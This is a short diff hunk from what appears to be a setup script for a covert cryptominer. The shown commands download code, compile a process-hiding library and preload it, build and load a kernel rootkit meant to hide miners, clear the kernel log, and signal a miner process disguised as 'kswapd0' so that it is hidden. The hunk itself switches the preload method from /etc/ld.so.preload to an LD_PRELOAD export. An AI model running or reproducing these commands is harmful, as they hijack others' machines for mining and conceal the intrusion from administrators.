@@ -326,7 +326,7 @@ wget https://raw.githubusercontent.com/littlAcen/xmrig_setup_m0dd3d-1/master/pro
 
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+export LD_PRELOAD=${PWD}/libprocesshider.so
 
 
 apt update && apt install git make gcc -y; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg -C ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
